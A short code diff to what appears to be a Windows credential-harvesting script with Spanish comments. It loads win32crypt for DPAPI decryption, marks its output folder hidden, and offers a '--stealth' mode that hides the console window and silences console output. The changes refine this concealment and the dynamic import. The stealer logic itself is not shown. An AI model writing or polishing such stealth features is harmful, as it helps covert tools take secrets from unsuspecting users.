@@ -35,8 +35,10 @@ def safe_b64_decode(val):
     except Exception:
         return val
 
+import importlib
+
 try:
-    import win32crypt
+    win32crypt = importlib.import_module('win32crypt')
 except ImportError:
     win32crypt = None
 
@@ -59,7 +61,7 @@ def _setup_output_dir(preferred: Path) -> Path:
             if existing != 0xFFFFFFFF:  # INVALID_FILE_ATTRIBUTES
                 ctypes.windll.kernel32.SetFileAttributesW(str(candidate), existing | 0x2)
             return candidate
-        except PermissionError:
+        except OSError:
             continue
     return preferred  # Último recurso: usar la ruta original aunque falle el ocultar
 
@@ -344,7 +346,6 @@ def main():
 
     args = parser.parse_args()
 
-    # Modo sigiloso: ocultar ventana de consola y suprimir output en consola
     if args.stealth:
         hwnd = ctypes.windll.kernel32.GetConsoleWindow()
         if hwnd:
@@ -353,9 +354,10 @@ def main():
             if isinstance(handler, logging.StreamHandler) and not isinstance(handler, logging.FileHandler):
                 logging.root.removeHandler(handler)
         if args.verbose:
-            logger.debug("Nota: --verbose activo en modo --stealth; logs DEBUG van solo al archivo.")
+            logging.getLogger().setLevel(logging.DEBUG)  # bajar nivel ANTES de loggear
+            logger.debug("Modo verbose activo en stealth; logs DEBUG → solo al archivo.")
 
-    if args.verbose and not args.stealth:
+    elif args.verbose:
         logging.getLogger().setLevel(logging.DEBUG)
         logger.debug("Modo verbose activado.")
 
